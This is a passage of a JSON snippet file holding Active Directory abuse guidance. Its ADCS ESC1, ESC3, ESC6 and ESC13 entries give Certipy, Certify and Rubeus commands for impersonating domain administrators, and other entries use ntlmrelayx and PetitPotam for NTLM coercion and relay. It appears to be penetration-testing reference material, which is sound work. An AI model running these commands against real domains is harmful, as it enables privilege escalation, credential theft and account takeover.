            "- Step 2: Convert the emitted certificate to PFX format:",
            "```bash",
            "certutil.exe -MergePFX .\\cert.pem .\\cert.pfx",
            "```",
            "- Step 3: Optionally purge all kerberos tickets from memory:",
            "```bash",
            "klist purge",
            "```",
            "- Step 4: Use Rubeus to request a ticket granting ticket (TGT) from the domain, specifying the target identity to impersonate and the PFX-formatted certificate created in Step 2:",
            "```bash",
            "Rubeus asktgt /user:forestrootda /domain:forestroot.com /certificate:cert.pfx /password:asdf /ptt",
            "```",
            "- Step 5: Optionally verify the TGT by listing it with the klist command:",
            "```bash",
            "klist",
            "```"
        ]
    },
    "ADCSESC3 linux": {
        "description": "",
        "prefix": "ADCSESC3",
        "body": [
            "The ESC3 attack can be carried out in the following manner.",
            "- Step 1: Use Certipy to request an enrollment agent certificate.",
            "```bash",
            "certipy req -u 'user@corp.local' -p 'password' -dc-ip 'DC_IP' -target 'ca_host' -ca 'ca_name' -template 'vulnerable template'",
            "```",
            "If the enrollment fails with an error message stating that the Email or DNS name is unavailable and cannot be added to the Subject or Subject Alternate name, then it is because the enrollee principal does not have their 'mail' or 'dNSHostName' attribute set, which is required by the certificate template. The 'mail' attribute can be set on both user and computer objects but the 'dNSHostName' attribute can only be set on computer objects. Computers have validated write permission to their own 'dNSHostName' attribute by default, but neither users nor computers can write to their own 'mail' attribute by default.",
            "- Step 2: Use the enrollment agent certificate to issue a certificate request on behalf of another user to a certificate template that allow for authentication and permit enrollment agent enrollment.",
            "```bash",
            "certipy req -u 'user@corp.local' -p 'password' -dc-ip 'DC_IP' -target 'ca_host' -ca 'ca_name' -template 'User' -on-behalf-of 'contoso\\administrator' -pfx 'user.pfx'",
            "```",
            "If the enrollment fails with an error message stating that the Email or DNS name is unavailable and cannot be added to the Subject or Subject Alternate name, then it is because the target principal does not have their 'mail' or 'dNSHostName' attribute set, which is required by the certificate template. Choose another target with the given attribute set.",
            "- Step 3: Request a ticket granting ticket (TGT) from the domain, specifying the target identity to impersonate and the PFX-formatted certificate created in Step 2.",
            "```bash",
            "certipy auth -pfx administrator.pfx -dc-ip 172.16.126.128",
            "```"
        ]
    },
    "ADCSESC3 windows": {
        "description": "",
        "prefix": "ADCSESC3",
        "body": [
            "The ESC3 attack can be carried out in the following manner.",
            "- Step 1: Use Certify to request an enrollment agent certificate.",
            "```bash",
            "Certify.exe request /ca:CORPDC01.CORP.LOCAL\\CORP-CORPDC01-CA /template:Vuln-EnrollmentAgent",
            "```",
            "If the enrollment fails with an error message stating that the Email or DNS name is unavailable and cannot be added to the Subject or Subject Alternate name, then it is because the enrollee principal does not have their 'mail' or 'dNSHostName' attribute set, which is required by the certificate template. The 'mail' attribute can be set on both user and computer objects but the 'dNSHostName' attribute can only be set on computer objects. Computers have validated write permission to their own 'dNSHostName' attribute by default, but neither users nor computers can write to their own 'mail' attribute by default.",
            "- Step 2: Convert the emitted certificate to PFX format.",
            "```bash",
            "certutil.exe -MergePFX .\\enrollmentcert.pem .\\enrollmentcert.pfx",
            "```",
            "- Step 3: Use the enrollment agent certificate to issue a certificate request on behalf of another user to a certificate template that allow for authentication and permit enrollment agent enrollment.",
            "```bash",
            "Certify.exe request /ca:CORPDC01.CORP.LOCAL\\CORP-CORPDC01-CA /template:User /onbehalfof:CORP\\itadmin /enrollcert:enrollmentcert.pfx",
            "```",
            "Save the certificate as `itadminenrollment.pem` and the private key as `itadminenrollment.key`.",
            "If the enrollment fails with an error message stating that the Email or DNS name is unavailable and cannot be added to the Subject or Subject Alternate name, then it is because the target principal does not have their 'mail' or 'dNSHostName' attribute set, which is required by the certificate template. Choose another target with the given attribute set.",
            "- Step 4: Convert the emitted certificate to PFX format.",
            "```bash",
            "certutil.exe -MergePFX .\\itadminenrollment.pem .\\itadminenrollment.pfx",
            "```",
            "- Step 5: Use Rubeus to request a ticket granting ticket (TGT) from the domain, specifying the target identity to impersonate and the PFX-formatted certificate created in Step 4.",
            "```bash",
            "Rubeus.exe asktgt /user:itadmin /domain:corp.local /certificate:itadminenrollment.pfx",
            "```"
        ]
    },
    "ADCSESC6a linux": {
        "description": "",
        "prefix": "ADCSESC6a",
        "body": [
            "An attacker may perform this attack in the following steps:",
            "- Step 1: Use Certipy to request enrollment in the affected template, specifying the affected enterprise CA and target principal to impersonate:",
            "```bash",
            "certipy req -u john@corp.local -p Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC6 -upn administrator@corp.local",
            "```",
            "If the enrollment fails with an error message stating that the Email or DNS name is unavailable and cannot be added to the Subject or Subject Alternate name, then it is because the enrollee principal does not have their 'mail' or 'dNSHostName' attribute set, which is required by the certificate template. The 'mail' attribute can be set on both user and computer objects but the 'dNSHostName' attribute can only be set on computer objects. Computers have validated write permission to their own 'dNSHostName' attribute by default, but neither users nor computers can write to their own 'mail' attribute by default.",
            "- Step 2: Request a ticket granting ticket (TGT) from the domain, specifying the certificate created in Step 1 and the IP of a domain controller:",
            "```bash",
            "certipy auth -pfx administrator.pfx -dc-ip 172.16.126.128",
            "```",
            "If the authentication fails then it may be because the DC enforces strong certificate mapping. This requirement can be met by including a URL parameter in the SAN with the target's SID, however not supported by Certipy. See the Windows abuse section for example."
        ]
    },
    "ADCSESC6a windows": {
        "description": "",
        "prefix": "ADCSESC6a",
        "body": [
            "An attacker may perform this attack in the following steps:",
            "- Step 1: Use Certify to request enrollment in the affected template, specifying the affected enterprise CA and target principal to impersonate:",
            "```bash",
            ".\\Certify.exe request /ca:rootdomaindc.forestroot.com\\forestroot-RootDomainDC-CA /template:ESC6 /altname:<target UPN or SAMAccountName without $> /url:\"tag:microsoft.com,2022-09-14:sid:<target SID>\"",
            "```",
            "If the enrollment fails with an error message stating that the Email or DNS name is unavailable and cannot be added to the Subject or Subject Alternate name, then it is because the enrollee principal does not have their 'mail' or 'dNSHostName' attribute set, which is required by the certificate template. The 'mail' attribute can be set on both user and computer objects but the 'dNSHostName' attribute can only be set on computer objects. Computers have validated write permission to their own 'dNSHostName' attribute by default, but neither users nor computers can write to their own 'mail' attribute by default.",
            "- Step 2: Convert the emitted certificate to PFX format:",
            "```bash",
            "certutil.exe -MergePFX .cert.pem .cert.pfx",
            "```",
            "- Step 3: Use Rubeus to request a ticket granting ticket (TGT) from the domain, specifying the target identity to impersonate and the PFX-formatted certificate created in Step 2:",
            "```bash",
            ".\\Rubeus.exe asktgt /certificate:cert.pfx /user:forestrootda /domain:forestroot.com /password:asdf /ptt",
            "```",
            "- Step 4: Optionally verify the TGT by listing it with the klist command:",
            "```bash",
            "klist",
            "```"
        ]
    },
    "ADCSESC6b linux": {
        "description": "",
        "prefix": "ADCSESC6b",
        "body": [
            "An attacker may perform this attack in the following steps:",
            "- Step 1: Use Certipy to request enrollment in the affected template, specifying the target enterprise CA and target principal to impersonate:",
            "```bash",
            "certipy req -u john@corp.local -p Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC6 -upn administrator@corp.local",
            "```",
            "If the enrollment fails with an error message stating that the Email or DNS name is unavailable and cannot be added to the Subject or Subject Alternate name, then it is because the enrollee principal does not have their 'mail' or 'dNSHostName' attribute set, which is required by the certificate template. The 'mail' attribute can be set on both user and computer objects but the 'dNSHostName' attribute can only be set on computer objects. Computers have validated write permission to their own 'dNSHostName' attribute by default, but neither users nor computers can write to their own 'mail' attribute by default.",
            "- Step 2: Request a ticket granting ticket (TGT) from the domain, specifying the certificate created in Step 1 and the IP of a domain controller:",
            "```bash",
            "certipy auth -pfx administrator.pfx -dc-ip 172.16.126.128",
            "```"
        ]
    },
    "ADCSESC6b windows": {
        "description": "",
        "prefix": "ADCSESC6b",
        "body": [
            "An attacker may perform this attack in the following steps:",
            "- Step 1: Use Certify to request enrollment int he affected template, specifying the affected certification authority and target principal to impersonate:",
            "```bash",
            ".\\Certify.exe request /ca:rootdomaindc.forestroot.com\\forestroot-RootDomainDC-CA /template:ESC6 /altname:forestrootda",
            "```",
            "If the enrollment fails with an error message stating that the Email or DNS name is unavailable and cannot be added to the Subject or Subject Alternate name, then it is because the enrollee principal does not have their 'mail' or 'dNSHostName' attribute set, which is required by the certificate template. The 'mail' attribute can be set on both user and computer objects but the 'dNSHostName' attribute can only be set on computer objects. Computers have validated write permission to their own 'dNSHostName' attribute by default, but neither users nor computers can write to their own 'mail' attribute by default.",
            "- Step 2: Convert the emitted certificate to PFX format:",
            "```bash",
            "certutil.exe -MergePFX .\\cert.pem .\\cert.pfx",
            "```",
            "- Step 3: Use Certipy to connect to the domain controller via Schannel, specifying the PFX-formatted certificate created in Step 2:",
            "```bash",
            "certipy auth -pfx .\\cert.pfx -dc-ip 10.4.0.4 -ldap-shell",
            "```"
        ]
    },
    "ADCSESC13 linux": {
        "description": "",
        "prefix": "ADCSESC13",
        "body": [
            "An attacker may perform this attack in the following steps:",
            "- Step 1: Use Certipy to request enrollment in the affected template, specifying the affected enterprise CA:",
            "```bash",
            "certipy req -u john@corp.local -p Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC13",
            "```",
            "If the enrollment fails with an error message stating that the Email or DNS name is unavailable and cannot be added to the Subject or Subject Alternate name, then it is because the enrollee principal does not have their 'mail' or 'dNSHostName' attribute set, which is required by the certificate template. The 'mail' attribute can be set on both user and computer objects but the 'dNSHostName' attribute can only be set on computer objects. Computers have validated write permission to their own 'dNSHostName' attribute by default, but neither users nor computers can write to their own 'mail' attribute by default.",
            "- Step 2: Request a ticket granting ticket (TGT) from the domain, specifying the certificate created in Step 1 and the IP of a domain controller:",
            "```bash",
            "certipy auth -pfx john.pfx -dc-ip 172.16.126.128",
            "```"
        ]
    },
    "ADCSESC13 windows": {
        "description": "",
        "prefix": "ADCSESC13",
        "body": [
            "The principal can now perform an ESC13 abuse with the following steps:",
            "- Step 1: Use Certify to request enrollment in the affected template, specifying the affected certification authority:",
            "```bash",
            "Certify.exe request /ca:rootdomaindc.forestroot.com\\forestroot-RootDomainDC-CA /template:\"ESC13\"",
            "```",
            "If the enrollment fails with an error message stating that the Email or DNS name is unavailable and cannot be added to the Subject or Subject Alternate name, then it is because the enrollee principal does not have their 'mail' or 'dNSHostName' attribute set, which is required by the certificate template. The 'mail' attribute can be set on both user and computer objects but the 'dNSHostName' attribute can only be set on computer objects. Computers have validated write permission to their own 'dNSHostName' attribute by default, but neither users nor computers can write to their own 'mail' attribute by default.",
            "Save the certificate as cert.pem and the private key as cert.key.",
            "- Step 2: Convert the emitted certificate to PFX format:",
            "```bash",
            "certutil.exe -MergePFX .\\cert.pem .\\cert.pfx",
            "```",
            "- Step 3: Optionally purge all kerberos tickets from memory:",
            "```bash",
            "klist purge",
            "```",
            "- Step 4: Use Rubeus to request a ticket granting ticket (TGT) from the domain, specifying the attacker identity, the PFX-formatted certificate created in Step 2, and the certificate password:",
            "```bash",
            "Rubeus asktgt /user:attacker /domain:forestroot.com /certificate:cert.pfx /password:asdf /ptt",
            "```",
            "- Step 5: Optionally verify the TGT by listing it with the klist command:",
            "```bash",
            "klist",
            "```"
        ]
    },
    "ManageCA linux": {
        "description": "",
        "prefix": "ManageCA",
        "body": [
            "This relationship alone is not enough to perform a privilege escalation or impersonation primitive. This relationship may contribute to other relationships and attributes, from which an escalation opportunity may emerge."
        ]
    },
    "ManageCA windows": {
        "description": "",
        "prefix": "ManageCA",
        "body": [
            "This relationship alone is not enough to perform a privilege escalation or impersonation primitive. This relationship may contribute to other relationships and attributes, from which an escalation opportunity may emerge."
        ]
    },
    "ManageCertificates linux": {
        "description": "",
        "prefix": "ManageCertificates",
        "body": [
            "This relationship alone is not enough to perform a privilege escalation or impersonation primitive. This relationship may contribute to other relationships and attributes, from which an escalation opportunity may emerge."
        ]
    },
    "ManageCertificates windows": {
        "description": "",
        "prefix": "ManageCertificates",
        "body": [
            "This relationship alone is not enough to perform a privilege escalation or impersonation primitive. This relationship may contribute to other relationships and attributes, from which an escalation opportunity may emerge."
        ]
    },
    "WritePKIEnrollmentFlag linux": {
        "description": "",
        "prefix": "WritePKIEnrollmentFlag",
        "body": [
            "This relationship alone is not enough to perform a privilege escalation or impersonation primitive. This relationship may contribute to other relationships and attributes, from which an escalation opportunity may emerge."
        ]
    },
    "WritePKIEnrollmentFlag windows": {
        "description": "",
        "prefix": "WritePKIEnrollmentFlag",
        "body": [
            "This relationship alone is not enough to perform a privilege escalation or impersonation primitive. This relationship may contribute to other relationships and attributes, from which an escalation opportunity may emerge."
        ]
    },
    "WritePKINameFlag linux": {
        "description": "",
        "prefix": "WritePKINameFlag",
        "body": [
            "This relationship alone is not enough to perform a privilege escalation or impersonation primitive. This relationship may contribute to other relationships and attributes, from which an escalation opportunity may emerge."
        ]
    },
    "WritePKINameFlag windows": {
        "description": "",
        "prefix": "WritePKINameFlag",
        "body": [
            "This relationship alone is not enough to perform a privilege escalation or impersonation primitive. This relationship may contribute to other relationships and attributes, from which an escalation opportunity may emerge."
        ]
    },
    "DCFor linux": {
        "description": "",
        "prefix": "DCFor",
        "body": [
            "Domain Controllers store all Active Directory credentials and configurations for all principals in the domain. If an adversary gains administrative access to a Domain Controller, there are several options at their disposal for compromising domain identities and domain-managed systems. Please see the references section for more information."
        ]
    },
    "DCFor windows": {
        "description": "",
        "prefix": "DCFor",
        "body": [
            "Domain Controllers store all Active Directory credentials and configurations for all principals in the domain. If an adversary gains administrative access to a Domain Controller, there are several options at their disposal for compromising domain identities and domain-managed systems. Please see the references section for more information."
        ]
    },
    "OIDGroupLink linux": {
        "description": "",
        "prefix": "OIDGroupLink",
        "body": [
            "An attacker may perform the ADCS ESC13 abuse which relies on the OID group link. This relationship alone is not enough to escalate rights or impersonate other principals."
        ]
    },
    "OIDGroupLink windows": {
        "description": "",
        "prefix": "OIDGroupLink",
        "body": [
            "An attacker may perform the ADCS ESC13 abuse which relies on the OID group link. This relationship alone is not enough to escalate rights or impersonate other principals."
        ]
    },
    "ExtendedByPolicy linux": {
        "description": "",
        "prefix": "ExtendedByPolicy",
        "body": [
            "An attacker may perform the ADCS ESC13 abuse which relies on an issuance policy included in a certificate. This relationship alone is not enough to escalate rights or impersonate other principals."
        ]
    },
    "ExtendedByPolicy windows": {
        "description": "",
        "prefix": "ExtendedByPolicy",
        "body": [
            "An attacker may perform the ADCS ESC13 abuse which relies on an issuance policy included in a certificate. This relationship alone is not enough to escalate rights or impersonate other principals."
        ]
    },
    "SyncedToADUser linux": {
        "description": "",
        "prefix": "SyncedToADUser",
        "body": [
            "An attacker may authenticate as the on-prem AD user using the Entra user’s credentials, for example by key-logging the user’s password, or by changing the Entra user’s password and waiting for the password write-back operation to complete."
        ]
    },
    "SyncedToADUser windows": {
        "description": "",
        "prefix": "SyncedToADUser",
        "body": [
            "An attacker may authenticate as the on-prem AD user using the Entra user’s credentials, for example by key-logging the user’s password, or by changing the Entra user’s password and waiting for the password write-back operation to complete."
        ]
    },
    "SyncedToEntraUser linux": {
        "description": "",
        "prefix": "SyncedToEntraUser",
        "body": [
            "An attacker may authenticate as the synchronized Entra user using the on-prem user’s credentials, for example by dumping the user’s plain-text credential from memory, key-logging the user’s password, or by changing the on-prem user’s password and authenticating with that new password."
        ]
    },
    "SyncedToEntraUser windows": {
        "description": "",
        "prefix": "SyncedToEntraUser",
        "body": [
            "An attacker may authenticate as the synchronized Entra user using the on-prem user’s credentials, for example by dumping the user’s plain-text credential from memory, key-logging the user’s password, or by changing the on-prem user’s password and authenticating with that new password."
        ]
    },
    "CoerceAndRelayNTLMToSMB linux": {
        "description": "",
        "prefix": "CoerceAndRelayNTLMToSMB",
        "body": [
            "1. Start the Relay Server The NTLM relay can be executed with [ntlmrelayx.py](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py).",
            "2. Coerce the Target Computer Several coercion methods are documented here: [Windows Coerced Authentication Methods](https://github.com/p0dalirius/windows-coerced-authentication-methods). Examples of tools include:[printerbug.py](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py)[PetitPotam](https://github.com/topotam/PetitPotam)"
        ]
    },
    "CoerceAndRelayNTLMToSMB windows": {
        "description": "",
        "prefix": "CoerceAndRelayNTLMToSMB",
        "body": [
            "1: Take Over the SMB Port on the Attacker Host To avoid a conflict with SMB running on the attacker-controlled Windows computer, it is necessary to takeover the SMB port. This can be achieved with smbtakeover.",
            "2: Start the Relay Server The NTLM relay can be executed with [Inveigh](https://github.com/Kevin-Robertson/Inveigh).",
            "3: Coerce the Target Computer Several coercion methods are documented here: [Windows Coerced Authentication Methods](https://github.com/p0dalirius/windows-coerced-authentication-methods). Examples of tools include:[SpoolSample](https://github.com/leechristensen/SpoolSample)[PetitPotam](https://github.com/topotam/PetitPotam)"
        ]
    },
    "CoerceAndRelayNTLMToLDAP linux": {
        "description": "",
        "prefix": "CoerceAndRelayNTLMToLDAP",
        "body": [
            "1. Start the Relay Server The NTLM relay can be executed with [ntlmrelayx.py](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py). To relay to LDAP and perform a Shadow Credentials attack against the target computer:ntlmrelayx.py -t ldap://<Domain Controller IP> --shadow-credentials",
            "2. Coerce the Target Computer Several coercion methods are documented here: [Windows Coerced Authentication Methods](https://github.com/p0dalirius/windows-coerced-authentication-methods). Examples of tools include:[printerbug.py](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py)[PetitPotam](https://github.com/topotam/PetitPotam)To trigger WebClient coercion (instead of regular SMB coercion), the listener must use a WebDAV Connection String format: \\\\SERVER_NETBIOS@PORT/PATH/TO/FILE.Petitpotam.py -d \"DOMAIN\" -u \"USER\" -p \"PASSWORD\" \"ATTACKER_NETBIOS@PORT/file.txt\" \"VICTIM_IP\""
        ]
    },
    "CoerceAndRelayNTLMToLDAP windows": {
        "description": "",
        "prefix": "CoerceAndRelayNTLMToLDAP",
        "body": [
            "1: Start the Relay Server The NTLM relay can be executed with Inveigh.",
            "2: Coerce the Target Computer Several coercion methods are documented here: [Windows Coerced Authentication Methods](https://github.com/p0dalirius/windows-coerced-authentication-methods). Examples of tools include:[SpoolSample](https://github.com/leechristensen/SpoolSample)[PetitPotam](https://github.com/topotam/PetitPotam)To trigger WebClient coercion (instead of regular SMB coercion), the listener must use a WebDAV Connection String format: \\\\SERVER_NETBIOS@PORT/PATH/TO/FILE. Example: SpoolSample.exe \"VICTIM_IP\" \"ATTACKER_NETBIOS@PORT/file.txt\""
        ]
    },
    "CoerceAndRelayNTLMToLDAPS linux": {
        "description": "",
        "prefix": "CoerceAndRelayNTLMToLDAPS",
        "body": [
            "1. Start the Relay Server The NTLM relay can be executed with [ntlmrelayx.py](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py). To relay to LDAP and perform a Shadow Credentials attack against the target computer:ntlmrelayx.py -t ldaps://<Domain Controller IP> --shadow-credentials",
            "2. Coerce the Target Computer Several coercion methods are documented here: [Windows Coerced Authentication Methods](https://github.com/p0dalirius/windows-coerced-authentication-methods). Examples of tools include:[printerbug.py](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py)[PetitPotam](https://github.com/topotam/PetitPotam)To trigger WebClient coercion (instead of regular SMB coercion), the listener must use a WebDAV Connection String format: \\\\SERVER_NETBIOS@PORT/PATH/TO/FILE.Petitpotam.py -d \"DOMAIN\" -u \"USER\" -p \"PASSWORD\" \"ATTACKER_NETBIOS@PORT/file.txt\" \"VICTIM_IP\""
        ]
    },
    "CoerceAndRelayNTLMToLDAPS windows": {
        "description": "",
        "prefix": "CoerceAndRelayNTLMToLDAPS",
        "body": [
            "1: Start the Relay Server The NTLM relay can be executed with Inveigh.",
            "2: Coerce the Target Computer Several coercion methods are documented here: [Windows Coerced Authentication Methods](https://github.com/p0dalirius/windows-coerced-authentication-methods). Examples of tools include:[SpoolSample](https://github.com/leechristensen/SpoolSample)[PetitPotam](https://github.com/topotam/PetitPotam)To trigger WebClient coercion (instead of regular SMB coercion), the listener must use a WebDAV Connection String format: \\\\SERVER_NETBIOS@PORT/PATH/TO/FILE. Example: SpoolSample.exe \"VICTIM_IP\" \"ATTACKER_NETBIOS@PORT/file.txt\""
        ]
    },
    "CoerceAndRelayNTLMToADCS linux": {
        "description": "",
        "prefix": "CoerceAndRelayNTLMToADCS",
        "body": [
            "1. Start the Relay Server The NTLM relay can be executed with [ntlmrelayx.py](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py). To relay to the enterprise CA and enroll a certificate, specify the HTTP(S) endpoint as the target and use the arguments--adcs --template <TEMPLATE_NAME>.",
            "2. Coerce the Target Computer Several coercion methods are documented here: [Windows Coerced Authentication Methods](https://github.com/p0dalirius/windows-coerced-authentication-methods). Examples of tools include:[printerbug.py](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py)[PetitPotam](https://github.com/topotam/PetitPotam)To trigger WebClient coercion (instead of regular SMB coercion), the listener must use a WebDAV Connection String format: \\\\SERVER_NETBIOS@PORT/PATH/TO/FILE."
        ]
    },
    "CoerceAndRelayNTLMToADCS windows": {
        "description": "",
        "prefix": "CoerceAndRelayNTLMToADCS",
        "body": [
            "1: Start the Relay Server The NTLM relay can be executed with Inveigh.",
            "2: Coerce the Target Computer Several coercion methods are documented here: [Windows Coerced Authentication Methods](https://github.com/p0dalirius/windows-coerced-authentication-methods). Examples of tools include:[SpoolSample](https://github.com/leechristensen/SpoolSample)[PetitPotam](https://github.com/topotam/PetitPotam)To trigger WebClient coercion (instead of regular SMB coercion), the listener must use a WebDAV Connection String format: \\\\SERVER_NETBIOS@PORT/PATH/TO/FILE. Example: SpoolSample.exe \"VICTIM_IP\" \"ATTACKER_NETBIOS@PORT/file.txt\""
        ]
    }
}